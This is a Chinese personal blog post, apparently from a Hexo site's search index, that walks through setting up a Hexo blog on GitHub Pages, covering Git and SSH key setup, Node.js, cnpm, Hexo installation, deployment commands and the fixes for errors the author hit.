<h4 id="2、GitHub创建个人仓库"><a href="#2、GitHub创建个人仓库" class="headerlink" title="2、GitHub创建个人仓库"></a>2、GitHub创建个人仓库</h4><p>用邮箱注册一GitHub账号 username：marmalade0<br>开始用qq邮箱不行，一直提醒验证邮箱，转用163邮箱注册成功<br> 点击GitHub中的New repository创建新仓库，<br> 仓库名：marmalade0.github.io</p>
<h4 id="3、安装Git"><a href="#3、安装Git" class="headerlink" title="3、安装Git"></a>3、安装Git</h4><p> <a href="https://www.liaoxuefeng.com/wiki/896043488029600">实用Git教程</a><br> 下载64位Git，全默认安装<br> <img src="/images/1/ScreenClip.png" alt=""></p>
<h6 id="将git与github绑定"><a href="#将git与github绑定" class="headerlink" title="将git与github绑定"></a>将git与github绑定</h6><p> ssh-keygen -t rsa -C “<a href="mailto:1563972718@qq.com">1563972718@qq.com</a>“<br>然后找到生成的.ssh的文件夹中的id_rsa.pub密钥，将内容全部复制<br>打开GitHub_Settings_keys 页面，新建new SSH Key<br><img src="/images/1/01.png" alt="42d793f5e11a63d85152788039686570.png"></p>
<p>Title为标题，任意填即可，将刚刚复制的id_rsa.pub内容粘贴进去，最后点击Add SSH key。<br>在Git Bash中检测GitHub公钥设置是否成功，输入 ssh <a href="mailto:git@github.com">git@github.com</a> 检验<br><img src="/images/1/02.png" alt="00f7e12cc75aa22957e6f8b72187f128.png"></p>
<p>设置GitHub密钥原因是，通过非对称加密的公钥与私钥来完成加密，公钥放置在GitHub上，私钥放置在自己的电脑里。GitHub要求每次推送代码都是合法用户，所以每次推送都需要输入账号密码验证推送用户是否是合法用户，为了省去每次输入密码的步骤，采用了ssh，当你推送的时候，git就会匹配你的私钥跟GitHub上面的公钥是否是配对的，若是匹配就认为你是合法用户，则允许推送。这样可以保证每次的推送都是正确合法的。</p>
<h4 id="4、安装Node-js"><a href="#4、安装Node-js" class="headerlink" title="4、安装Node.js"></a>4、安装Node.js</h4><p><a href="https://nodejs.org/dist/v4.4.3/node-v4.4.3-x64.msi">64位安装地址</a><br>安装成功后检验环境变量中是否有<br><img src="/images/1/3.png" alt="06bea625b17581dd388ca0386f702221.png"><br>在系统环境变量添加NODE_PATH<br>值为F:\nodejs\node_global\node_modules<br>安装一个express<br>npm install express -g<br>cmd中输入node，然后输入require(‘express’)<br>出现<br><img src="/images/1/4.png" alt="52657a6521fa92244759f23d5c1f2e36.png"><br>即成功正常加载模块</p>
<h6 id="安装cnpm"><a href="#安装cnpm" class="headerlink" title="安装cnpm"></a>安装cnpm</h6><p>（阿里开发，国内速度快）<br>输入<br>npm install -g cnpm –registry=<a href="https://registry.npm.taobao.org">https://registry.npm.taobao.org</a><br>输入cnpm -v ，检测是否正常，但是这里会报错<br>添加环境变量后再输<br><img src="/images/1/5.png" alt="21d0163dea46a40305b99c02ee485d28.png"><br>安装成功</p>
<h3 id="5、hexo安装"><a href="#5、hexo安装" class="headerlink" title="5、hexo安装"></a>5、hexo安装</h3><p>百度hexo<br>选择文档|hexo，按照教程安装<br>新建一个blog文件夹，cmd切换到该目录下，<br>npm install -g hexo-cli安装<br>等较长时间后<br>hexo init 博客名<br>cd 博客名<br>npm install<br><img src="/images/1/6.png" alt="093d34b7b0923d359032f28b3b625004.png"><br>完成<br><img src="/images/1/7.png" alt="d765e4114126706e112277382f345bb7.png"></p>
<p>hexo s -p 5555选择5555端口，浏览器搜localhost:5555即可进入博客（为安全起见，开一个端口来本地预览，无误后再部署到GitHub上）</p>
<p>看一下是什么样子的！</p>
<blockquote>
<p><strong>注：<br>根目录：My Blog/marmalade<br>hexo网站配置文件：根目录下的_config.yml<br>主题配置文件：next主题里的_config.yml</strong></p>
</blockquote>
<h3 id="6、hexo发布至github"><a href="#6、hexo发布至github" class="headerlink" title="6、hexo发布至github"></a>6、hexo发布至github</h3><p>把博客文件夹拖入sublime里<br>Source里面的_posts为内容</p>
<h6 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h6><p>打开_config.yml改最后的为<br><img src="/images/1/8.png" alt="2418aff8ccf1a0e2ae46bdc2fa467e45.png"></p>
<p>前面的改为url: <a href="https://marmalade0.github.io">https://marmalade0.github.io</a><br>autnor：lijunliang<br><img src="/images/1/9.png" alt="395d5f727e5461bca6a37ae7d673df55.png"></p>
<p>hexo clean （清除缓存，即删除public文件夹，在部署博客时最好先用一下此命令来清理缓存）<br>cmd中hexo g(生成静态文件)(即同步到博客中)<br>hexo d（部署到github）<strong>两者可以连起来写为hexo g -d</strong><br>以上几个命令用来部署博客内容到网站中，以后会经常用到。<br><img src="/images/1/10.png" alt="bde9280975c1018708585ddb8e40ab3f.png"><br>报错<br>装一个插件<br>npm install hexo-deployer-git –save<br>末尾加分支branch: master<br>然后hexo d同步到github上<br><strong>后来再hexo d的时候出现错误</strong><br><img src="/images/1/11.png" alt="28e7647f32d5c36e3bd3eeaf6594ac62.png"><br>，上网搜Error: Spawn failed，见有相同问题的<br>解决方法：把F:\Git\Git\bin添加到系统变量的path中<br>再运行，成功<br><img src="/images/1/12.png" alt=""></p>
]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>博客建立</tag>
        <tag>hexo</tag>
        <tag>next主题</tag>
        <tag>github</tag>
      </tags>
  </entry>
</search>
